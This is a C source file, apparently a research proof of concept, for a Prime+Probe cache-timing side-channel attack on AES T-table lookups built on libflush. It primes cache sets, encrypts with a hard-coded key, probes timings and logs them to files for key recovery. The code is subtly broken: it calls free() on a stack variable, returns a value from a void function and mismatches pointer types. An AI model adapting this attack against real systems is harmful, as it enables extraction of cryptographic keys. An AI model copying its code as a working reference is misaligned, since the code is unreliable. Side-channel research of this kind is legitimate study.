/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include "AES.h"
#include "gaddr.h"
#include "gset.h"
#include <getopt.h>
#include <inttypes.h>
#include <jni.h>
#include <libflush/libflush.h>
#include <malloc.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>


#define BIND_TO_CPU 0 // 默认绑定的cpu
#define BIND_THREAD_TO_CPU 1 // thread计时绑定的cpu
#define AES_TABLE_LENGTN 16 // the block num of aes look up table
#define AES_TABLE_SUM 64 // AES Table所能映射到的set个数
#define AES_TABLE_BASE 100 // 默认T0起始位置对应的SET索引
#define CACHE_SET_NUMS 512 // 目标机cache所包含的set数
#define BASE_COUNTS 5000 // 获取base时间的prime probe个数
#define DELAY_TIME 10 // prime与probe之间的时间间隔，默认为10us
#define SUM_COUNTS 10000 // 攻击次数
#define MODE_ATTACK 1 // 攻击模式 1表示对victim进行攻击
#define NODE_BASE 0 // 攻击模式 0表示获取set base时间
#define AES_KEY_LENGTH 16       // the length of key
#define AES_PLAINTEXT_LENGTH 16 // the length of plaintext

#define _STR(x) #x
#define STR(x) _STR(x)

void doaes(unsigned char *inaes, aesTableSet *tables); // execute aes algorithm with a given plaintext

unsigned char key[AES_KEY_LENGTH] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66,
                                     0x77, 0x00, 0x11, 0x22, 0x33, 0x44,
                                     0x55, 0x66, 0x77};


static void print_help(char* argv[]) {
  fprintf(stdout, "Usage: %s [OPTIONS]\n", argv[0]);
  fprintf(stdout, "\t-c, -cpu <value>\t Bind to cpu (default: " STR(BIND_TO_CPU) ")\n");
  fprintf(stdout, "\t-m, -mode <value>\t program mode (default: " STR(MODE_ATTACK) ")\n");
  fprintf(stdout, "\t-n, -nums <value>\t base example nums (default: " STR(BASE_COUNTS) ")\n");
  fprintf(stdout, "\t-d, -delay <value>\t delay between prime and probe (default: " STR(DELAY_TIME) ")\n");
  fprintf(stdout, "\t-s, -sum <value>\t attack sum counts (default: " STR(SUM_COUNTS) ")\n");
  fprintf(stdout, "\t-b, -base <value>\t Table base set (default: " STR(AES_TABLE_BASE) ")\n");
  fprintf(stdout, "\t-t, -help\t\thelp page\n");
} 
                                                          

int main(int argc, char* argv[]) {
  aesTableSet tables; // the struct contains aes t-table's start addr

  libflush_session_t *libflush_session;

  size_t delay = DELAY_TIME;
  size_t sum = SUM_COUNTS;
  size_t nums = BASE_COUNTS;

  /* Define parameters */
  size_t cpu = BIND_TO_CPU;
  size_t thread_cpu = BIND_THREAD_TO_CPU;
  size_t base = AES_TABLE_BASE;

  size_t mode = MODE_ATTACK;

  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
  fprintf(stdout, "NUMBER OF CPUS: %zu\n", number_of_cpus);

  static const char* short_options = "c:m:n:d:s:b:h:";
  static struct option long_options[] = {
    {"cpu", required_argument, NULL, 'c'},
    {"mode", required_argument, NULL, 'm'},
    {"nums", required_argument, NULL, 'n'},
    {"base", required_argument, NULL, 'b'},
    {"delay", required_argument, NULL, 'd'},
    {"sum", required_argument, NULL, 's'},
    {"help", no_argument, NULL, 'h'},
    {NULL, 0, NULL, 0}
  };

  int c;
  while ((c = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
    switch(c) {
      case 'c':
        cpu = atoi(optarg);
        if (cpu >= number_of_cpus) {
          fprintf(stderr, "Error: CPU %zu is not available.\n", cpu);
          return -1;
        }
        break;
      case 'b':
        base = atoi(optarg);
        if (base >= CACHE_SET_NUMS || base < 0) {
          fprintf(stderr, "Error: base %zu in not available.\n", base);
          return -1;
        }
        break;
      case 'd':
        delay = atoi(optarg);
        if (delay < 0) {
          fprintf(stderr, "Error: delay %zu in not available.\n", delay);
          return -1;
        }
        break;
      case 's':
        sum = atoi(optarg);
        if (sum < 0) {
          fprintf(stderr, "Error: sum %zu in not available.\n", sum);
          return -1;
        }
        break;
      case 'm':
        mode = atoi(optarg);
        if (mode != 0 && mode != 1) {
          fprintf(stderr, "Error: mode %zu in not available.\n", mode);
          return -1;
        }
        break;
      case 'n':
        nums = atoi(optarg);
        if (nums <= 0) {
          fprintf(stderr, "Error: nums %zu in not available.\n", mode);
          return -1;
        }
        break;
      case 'h':
        print_help(argv);
        return 0;
      default:
        fprintf(stderr, "Error: Invalid option '-%c'\n", optopt);
        return -1;
    }
  }

  /* Bind to CPU */
  cpu = cpu % number_of_cpus;
  thread_cpu = thread_cpu % number_of_cpus;
  if (libflush_bind_to_cpu(cpu) == false) {
    fprintf(stderr, "Warning: Could not bind to CPU: %zu\n", cpu);
  } else {
    fprintf(stdout, "attack process bind to cpu %d\n", cpu);
  }

  /* Initialize libflush */
  libflush_session_args_t args;
  args.bind_to_cpu = thread_cpu;

  if (libflush_init(&libflush_session, &args) == false) {
    fprintf(stderr, "Error: Could not initialize libflush\n");
    return -1;
  }

  fprintf(stdout, "initialize libflush success!\n");
  fprintf(stdout, "now start asynchronized aes attack\n");

  unsigned char inaes[AES_PLAINTEXT_LENGTH] = {0x61, 0x62, 0x63, 0x64, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x61, 0x61, 0x62, 0x63, 0x64, 0x65};
  doaes(inaes, &tables);

  if (mode == MODE_ATTACK) {
    getBaseTime(libflush_session);

    uint32_t *tmp;
    tmp = (uint32_t *)malloc(AES_TABLE_SUM * sizeof(uint32_t));
    if (tmp == NULL) {
      fprintf(stderr, "ERROR : could not allocate memory to tmp!!\n");
      return -1;
    }
    memset(tmp, 0, AES_TABLE_SUM * sizeof(uint32_t));

    for (int i = 0; i < sum; i++) {
      getTmpTime2(libflush_session, tmp, base, delay, inaes, tables);
      // usleep(delay);
    }
    aes_ecb_encrypt(NULL, NULL, NULL, &tables);
    free(tmp);
    fprintf(stdout, "aes asynchronized attack completed\n");
  } else {
    fprintf(stdout, "calculate base time\n");
    getBaseTime(libflush_session);
  }
  return 0;
}

void getTmpTime(libflush_session_t *libflush_session, uint32_t *tmp, int base, int delay, unsigned int * inaes, aesTableSet tables) {
  base = tables.t0_si[0];
  int base0 = base;
  int base1 = base + 16;
  int base2 = base + 32;
  int base3 = base + 48;
  for (int j = 0; j < AES_TABLE_LENGTN; j++) {
    libflush_prime(libflush_session, base0 + j);
    libflush_prime(libflush_session, base1 + j);
    libflush_prime(libflush_session, base2 + j);
    libflush_prime(libflush_session, base3 + j);
  }
  doaes(inaes, &tables);
  // usleep(delay);
  for (int j = 0; j < AES_TABLE_LENGTN; j++) {
    tmp[j + AES_TABLE_LENGTN * 0] = libflush_probe(libflush_session, base0 + j);
    tmp[j + AES_TABLE_LENGTN * 1] = libflush_probe(libflush_session, base1 + j);
    tmp[j + AES_TABLE_LENGTN * 2] = libflush_probe(libflush_session, base2 + j);
    tmp[j + AES_TABLE_LENGTN * 3] = libflush_probe(libflush_session, base3 + j);
  }
  writeT2TF(tmp);
}

//获取aes table占用的set的prime probe访问时间
void getTmpTime2(libflush_session_t *libflush_session, uint32_t *tmp, int base, int delay, unsigned int * inaes, aesTableSet tables) {
  base = tables.t0_si[0];
  for (int j = 0; j < AES_TABLE_SUM; j++) {
    libflush_prime(libflush_session, base + j);
  }
  // usleep(delay);
  doaes(inaes, &tables);
  for (int j = 0; j < AES_TABLE_SUM; j++) {
    tmp[j] = libflush_probe(libflush_session, base + j);
  }
  writeT2TF(tmp);
}

//获取各个set的基准时间
void getBaseTime(libflush_session_t *libflush_session) {
  uint64_t time = 0;
  uint32_t *tmp;
  tmp = (uint32_t *)malloc(BASE_COUNTS * sizeof(uint32_t));
  if (tmp == NULL) {
    fprintf(stderr, "ERROR : could not allocate memory to tmp!!\n");
    return -1;
  }
  memset(tmp, 0, BASE_COUNTS * sizeof(uint32_t));
  for (int i = 0; i < CACHE_SET_NUMS; i++) {
    for (int j = 0; j < BASE_COUNTS; j++) {
    libflush_prime(libflush_session, i);
    time = libflush_probe(libflush_session, i);
    tmp[j] = time;
    }
    writeBaseTime(tmp);
  }
  free(tmp);
}

void writeBaseTime(uint32_t *tmp) {
  FILE* file = NULL;
  if ((file = fopen("asynbase", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file asynbase!\n");
    return;
  }
  for (int i = 0; i < BASE_COUNTS; i++) {
    fprintf(file, "%10zu", tmp[i]);
  }
  fprintf(file, "\n");
  fflush(file);
  fclose(file);
}

void writeT2TF(uint32_t *tmp) {
  FILE* file = NULL;
  if ((file = fopen("asyntime", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file ntime!\n");
    return;
  }
  time_t time_stamp;
  struct tm* lt;
  time(&time_stamp);
  lt = localtime(&time_stamp);
  fprintf(file, "%d:%d:%d ", lt->tm_hour, lt->tm_min, lt->tm_sec);
  free(&time_stamp);
  for (int i = 0; i < AES_TABLE_SUM; i++) {
    fprintf(file, "%10zu", tmp[i]);
  }
  fprintf(file, "\n");
  fflush(file);
  fclose(file);
  for (int i = 0; i <AES_TABLE_SUM; i++) {
    tmp[i] = 0;
  }
}

void doaes(unsigned char *inaes, aesTableSet *tables) {
  unsigned char outaes[16] = {0};
  aes_ecb_encrypt(key, inaes, outaes, tables);
}
